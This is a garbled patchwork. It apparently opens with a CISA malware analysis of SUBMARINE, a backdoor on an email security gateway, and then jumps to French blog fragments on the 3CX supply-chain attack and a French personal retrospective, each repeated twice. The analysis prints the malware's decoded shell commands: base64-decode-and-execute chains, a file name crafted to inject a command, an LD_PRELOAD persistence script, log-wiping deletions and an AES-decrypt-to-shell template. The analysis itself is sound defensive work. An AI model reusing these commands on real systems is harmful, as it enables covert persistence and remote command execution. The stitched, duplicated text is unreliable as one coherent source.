&lt;p&gt;The file 'config.TRG' is a SUBMARINE artifact. The presence of the filename, 'config.TRG' does not indicate that the ESG is infected. Instead, it is the actual contents of the file that determine whether it is infected or not. The contents of 'config.TRG' is contained within the SQL database file called 'config.snapshot' and the MIME attachments. Presence of the contents of the file 'config.TRG' within the SQL database is indicative of an infection of SUBMARINE.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The file contains a malicious SQL trigger called ‘cuda_trigger’ (Figure 1). This SQL trigger is set to run as root on the local host before a row is deleted from the database. After the trigger parameters are met, two actions occur. First a compressed, base64 encoded blob containing 2 files is written into a file called ‘r’ in the ‘/var/tmp’ directory (Figure 2). Second, a base64 encoded command is executed (Figure 3).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin Base64 Decoded Command--&lt;br /&gt;&lt;br /&gt;
			cat /var/tmp/r | base64 -d -i | tar -zx -C /var/tmp&lt;br /&gt;&lt;br /&gt;
			nohup bash /var/tmp/run.sh &amp;lt;BSMTP_ID&amp;gt; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&lt;br /&gt;&lt;br /&gt;
			rm -f /root/machine\` *chmod +x /root/mac*&lt;br /&gt;&lt;br /&gt;
			sh /root/mach*\`*&lt;br /&gt;&lt;br /&gt;
			--End Base64 Decoded Command--&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The commands will decode the base64 encoded string and execute the decoded result as a shell command. The commands will pass the contents of the file 'r' to be decoded then decompressed with the 'tar' command. Then, the file 'run.sh' executes with the 'nohup' parameter. The 'nohup' parameter allows the process launched on the shell to continue executing even if the shell is closed. The 'BSMTP_ID' is passed and all errors redirected and discarded to the '/dev/null' directory. Lastly, the contents of the '/root/machine' directory will be removed, permissions are set to executable, and shell scripts containing a name with the string 'mach*' in the root directory are executed.&lt;/p&gt;

&lt;p&gt;The file 'machineecho -n Y2htb2QgK3ggL3Jvb3QvbWFjKgpzaCAvcm9vdC9tYWNoKlxgKgoK _ base64 -d _sh`_' is a SUBMARINE artifact. The file is a shell script identified in the '/root' directory and contains base64 encoded commands. The name of the file is designed to exploit a vulnerability on the target environment where the base64 string within the file name will be executed on the Linux shell.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin Base64 Decoded Name/Command--&lt;br /&gt;&lt;br /&gt;

			--End Base64 Decoded Name/Command--&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The above commands will change the permissions of the directory, '/root/mac*', to executable.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The file contains a series of operations, such as decoding a base64 encoded string and executing the decoded result as a shell command. The decoded base64 string represents a series of commands that will be executed by the shell.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			~Begin Base64 Decoded Command~&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			cat /var/tmp/r | base64 -d -i | tar -zx -C /var/tmp&lt;br /&gt;&lt;br /&gt;
			nohup bash /var/tmp/run.sh &amp;lt;REDACTED BSMTP_ID&amp;gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&lt;br /&gt;&lt;br /&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;The file 'run.sh' is a SUBMARINE loader. The file is a shell script located at within the archive 'r' in the '/var/tmp' directory. The purpose of 'run.sh' is to perform a combination of file manipulation, script generation and execution (Figure 4). There are 4 variables within 'run.sh':&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin Variable List--&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			B1=$1&lt;br /&gt;&lt;br /&gt;
			F="/boot/os_tools/hw-set"&lt;br /&gt;&lt;br /&gt;
			S="/home/product/code/firmware/current/sbin/smtpctl"&lt;br /&gt;&lt;br /&gt;
			A="/boot/os_tools/libutil.so"&lt;br /&gt;&lt;br /&gt;
			B=`echo -n "sed -i \"s|exec|BSMTP_ID=$B1 LD_PRELOAD=$A exec|g\" $S"|base64 -w0`&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--End Variable List--&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The script begins by moving SUBMARINE from the '/var/tmp/' directory to the '/boot/os_tools/' directory for persistence.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The variable "B" is declared as a 'sed' command that replaces all occurrences of the string 'exec' with `BSMTP_ID=$1 LD_PRELOAD=/boot/os_tools/libutil.so exec /home/product/code/firmware/current/sbin/smtpctl'. This 'sed' command is then base64 encoded.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			A new file called 'hw-set' is created in the '/boot/os_tools/' directory. A line is appended to the 'smtpctl' file which checks for the string 'LD_PRELOAD'. If the string is not found, the base64 encoded string stored in variable "B" is decoded and executed as a shell command and 'smtpctl' is restarted.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The 'chmod' command is used to set executable permissions for 'hw-set'.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The 'sed' command is used with a '-i' flag to modify the file 'update_version' within the '/boot/os_tools/' directory with an appended string to line 44. The appended string, "system('/boot/os_tools/hw-set 2&amp;gt;&amp;amp;1 &amp;gt;/dev/null &amp;amp;');", will run the file 'hw-set' in the background and redirect both output and errors to 'dev/null' whenever the file 'update_version' is executed.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The file 'hw-set' is executed and the 'sed' command with the '-i' flag is used to insert the string 'sleep 2m' on line 1 to set a sleep duration of 2 minutes.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			Finally, all files and directories within '/var/tmp/' directory are removed.&lt;/p&gt;

&lt;p&gt;The file 'hw-set' is a SUBMARINE artifact. The file is a shell script located in the '/boot/os_tools/' directory and contains shell commands as well as a base64 encoded string (Figure 5). The shell script is set to sleep for 2 minutes prior to execution. The 'grep' command checks if the string 'LD_PRELOAD' is contained within the 'smtpctl' file located at '/home/product/code/firmware/current/sbin/'. The exclamation point (!) prepending the script is used to check for success or failure of the 'grep' command. If the string 'LD_PRELOAD' is not identified, a base64 encoded 'sed' command is used to modify the 'smtpctl' file (Figure 6).&lt;/p&gt;

&lt;p&gt;The file 'smtpctl' is a SUBMARINE loader. The file is a maliciously modified shell script used to remove mail files in 2 directories as well as load SUBMARINE as a shared library for the Batched Simple Mail Transfer Protocol (BSMTP) daemon.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			~Begin File Removal Commands~&lt;br /&gt;&lt;br /&gt;
			rm -f /mail/scan/body*&lt;br /&gt;&lt;br /&gt;
			rm -f /mail/tmp/mimeattach.*&lt;br /&gt;&lt;br /&gt;
			~End File Removal Commands~&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			Appended malicious code at the bottom of 'smtpctl.sh' sets the BSMTP_ID and SUBMARINE is preloaded as a shared library from the '/boot/os_tools' directory. It then executes the BSMTP daemon. If the BSMTPD_PID variable is set, debug mode is enabled. If the BSMTPD_PID variable is not set, execution continues without enabling debug mode. Additionally, any instances of the string 'reload' in the command are replaced with 'restart' and all errors are redirected to '/dev/null' (Figure 7).&lt;/p&gt;

&lt;/table&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;The file 'libutil.so' is the SUBMARINE payload. 'libutil.so' is preloaded into the BSMTP daemon, the Linux executable responsible for receiving emails, and processing Simple Mail Transfer Protocol (SMTP) reply messages. Linux Shared Object Preloading is analogous to Dynamic-Link Library (DLL) side loading and DLL injection in the Windows OS.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			This file is preloaded using the 'LD_PRELOAD' parameter, applied to 'bsmtpd', the BSMTP daemon executable. The preload parameter is added to two configuration files, files that control the behavior of 'bsmtpd.' When the configuration files restart the daemon, 'libutil.so' is loaded into its process memory, giving it the same privileges and access as 'bsmtpd.'&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The malware obtains the BSMTP_ID environment variable from the infected system. The BSMTP_ID has the capacity to be used as a port for malicious traffic. (Figure 8). The process this shared object file is running in, 'bsmtpd', is duplicated and launched using the 'fork' Linux function (Figure 9). The malware opens a connection to 127.0.0.1 on the victim machine it is running on (Figure 10). The 'recv' function is called after the connection is opened, showing that the malware has the capacity to obtain information from the context/environment its executed on.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			Figure 11, Pane 1, shows configuration settings for the BSMTP daemon, that allows any email traffic for the address range of 127/8 and multiple actions including 'ehlo.' Pane 2 shows the malware intaking data, and loading the 'ehlo' action into memory.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			Figure 12, Pane 1, shows the malware, in conjunction with 'snprintf_chk', printing the string 'echo -n '%s' | base64 -d | openssl aes-256-cbc -d -K 66833b26%d -iv 69822b6c%d 2&amp;gt;/dev/null | sh', to the Linux shell. The string is a command that accepts input '%s', decodes it with Base64, decrypts it with AES, pipes errors to std_out and executes it on the target with the 'sh' bash command and 'system' Linux function. Lastly, the malware has the capacity to print the SMTP string, '250-mail2.eccentric.duck Hello %s [%s], pleased to meet you' . Therefore, given this information, the malware has the capacity to accept encoded and encrypted inputs from 'bsmtpd', execute them, and print a message.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;

Ce logiciel est utilisé par de nombreuses entreprises pour leur téléphonie. Il s’installe sur les postes de travail Windows, MacOs et Android.&lt;/p&gt;&lt;p&gt;Le but de cet article n’est pas tant d’analyser l’attaque par elle-même et le malware déployé puisque cela a été très bien fait par Volexity &lt;a href="https://www.volexity.com/blog/2023/03/30/3cx-supply-chain-compromise-leads-to-iconic-incident/"&gt;https://www.volexity.com/blog/2023/03/30/3cx-supply-chain-compromise-leads-to-iconic-incident/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;et une bonne infographie de Thomas Roccia &lt;a href="https://twitter.com/fr0gger_/status/1641668394155151366?s=20"&gt;https://twitter.com/fr0gger_/status/1641668394155151366?s=20&lt;/a&gt; est également disponible, mais d’expliquer les impacts d’une telle attaque.&lt;/p&gt;&lt;h3&gt;Petits rappel des faits.&lt;/h3&gt;&lt;p&gt;Le processus de mise à jour a été compromis par un groupe d’attaquant. Le but est lorsque le logiciel 3CX va faire sa mise à jour, il va installer en plus une dll malveillante qu’il va charger. L’impact est direct puisque l’attaquant à la main sur l’ensemble des machines dont la mise à jour a été faite.&lt;/p&gt;&lt;p&gt;Dans notre cas, c’est la dll ffmpeg.dll qui va être installée.&lt;/p&gt;&lt;p&gt;Ensuite comme l’explique Volexity, la dll télécharge après son chargement un fichier hosté sur github qui est encodé en base64 et chiffré en AES. Ce fichier a des urls ou le malware va être téléchargé.&lt;/p&gt;&lt;h3&gt;Le stealer lui-même&lt;/h3&gt;&lt;p&gt;On a d’abord parlé de stealer mais le malware est plus un outil de reconnaissance. En effet, au vu du nombre d’utilisateurs de 3CX (12 millions), l’attaquant a cette technique de pêche au chalut, va devoir trier. Pour cela, il se base sur les informations remontées sur le C2 dans un fichier json ainsi que la GUID de la machine qui passe dans les headers HTTPs.

Ce logiciel est utilisé par de nombreuses entreprises pour leur téléphonie. Il s’installe sur les postes de travail Windows, MacOs et Android.&lt;/p&gt;&lt;p&gt;Le but de cet article n’est pas tant d’analyser l’attaque par elle-même et le malware déployé puisque cela a été très bien fait par Volexity &lt;a href="https://www.volexity.com/blog/2023/03/30/3cx-supply-chain-compromise-leads-to-iconic-incident/"&gt;https://www.volexity.com/blog/2023/03/30/3cx-supply-chain-compromise-leads-to-iconic-incident/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;et une bonne infographie de Thomas Roccia &lt;a href="https://twitter.com/fr0gger_/status/1641668394155151366?s=20"&gt;https://twitter.com/fr0gger_/status/1641668394155151366?s=20&lt;/a&gt; est également disponible, mais d’expliquer les impacts d’une telle attaque.&lt;/p&gt;&lt;h3&gt;Petits rappel des faits.&lt;/h3&gt;&lt;p&gt;Le processus de mise à jour a été compromis par un groupe d’attaquant. Le but est lorsque le logiciel 3CX va faire sa mise à jour, il va installer en plus une dll malveillante qu’il va charger. L’impact est direct puisque l’attaquant à la main sur l’ensemble des machines dont la mise à jour a été faite.&lt;/p&gt;&lt;p&gt;Dans notre cas, c’est la dll ffmpeg.dll qui va être installée.&lt;/p&gt;&lt;p&gt;Ensuite comme l’explique Volexity, la dll télécharge après son chargement un fichier hosté sur github qui est encodé en base64 et chiffré en AES. Ce fichier a des urls ou le malware va être téléchargé.&lt;/p&gt;&lt;h3&gt;Le stealer lui-même&lt;/h3&gt;&lt;p&gt;On a d’abord parlé de stealer mais le malware est plus un outil de reconnaissance. En effet, au vu du nombre d’utilisateurs de 3CX (12 millions), l’attaquant a cette technique de pêche au chalut, va devoir trier. Pour cela, il se base sur les informations remontées sur le C2 dans un fichier json ainsi que la GUID de la machine qui passe dans les headers HTTPs. Si la machine l’intéresse, il va maintenir le C2.&lt;/p&gt;&lt;p&gt;Autre impact fort, mis en avant par Volexity, est un chargeur de shellcode. Ce qui veut dire qu’une fois, le malware exécuté, il peut charger ce qu’il veut comme code. Et surtout faire cela uniquement en mémoire. Cela sera donc plus difficile aux équipes de réponses sur incident et aux analystes de savoir ce que souhaite réellement l’attaquant.&lt;/p&gt;&lt;h3&gt;L’attribution à la nord Corée&lt;/h3&gt;&lt;p&gt;L’attaque a été attribuée par Lazarus.

Cette aventure m’a été proposée par mon pote Paul. Au départ, on se demande un peu où l’on va. Mais finalement, ça restera une des expériences les plus enrichissantes que j’ai pu réaliser.&lt;/p&gt;&lt;p&gt;La seconde a été la prise en charge de la majeure cybersécurité de mon école. C’est aussi un but que je m’étais donné en arrivant dans l’enseignement, d’améliorer, à mon niveau, les formations proposées en essayant d’être à l’état de l’art, tout en proposant du contenu sérieux et crédible, pas comme d’autres qui surfent sur des buzzwords.&lt;/p&gt;&lt;p&gt;La troisième a été l’arrêt des publications sur mon medium, mais des lives tweets sur des faits en cours qui auront été très suivis par la communauté.&lt;/p&gt;&lt;p&gt;Coté open source, j’ai participé au développement de &lt;a href="https://github.com/sebdraven/IOCmite"&gt;&lt;em&gt;IOCmite&lt;/em&gt;&lt;/a&gt; avec Eric Leblond et Cédric Leroux.

Cette aventure m’a été proposée par mon pote Paul. Au départ, on se demande un peu où l’on va. Mais finalement, ça restera une des expériences les plus enrichissantes que j’ai pu réaliser.&lt;/p&gt;&lt;p&gt;La seconde a été la prise en charge de la majeure cybersécurité de mon école. C’est aussi un but que je m’étais donné en arrivant dans l’enseignement, d’améliorer, à mon niveau, les formations proposées en essayant d’être à l’état de l’art, tout en proposant du contenu sérieux et crédible, pas comme d’autres qui surfent sur des buzzwords.&lt;/p&gt;&lt;p&gt;La troisième a été l’arrêt des publications sur mon medium, mais des lives tweets sur des faits en cours qui auront été très suivis par la communauté.&lt;/p&gt;&lt;p&gt;Coté open source, j’ai participé au développement de &lt;a href="https://github.com/sebdraven/IOCmite"&gt;&lt;em&gt;IOCmite&lt;/em&gt;&lt;/a&gt; avec Eric Leblond et Cédric Leroux.
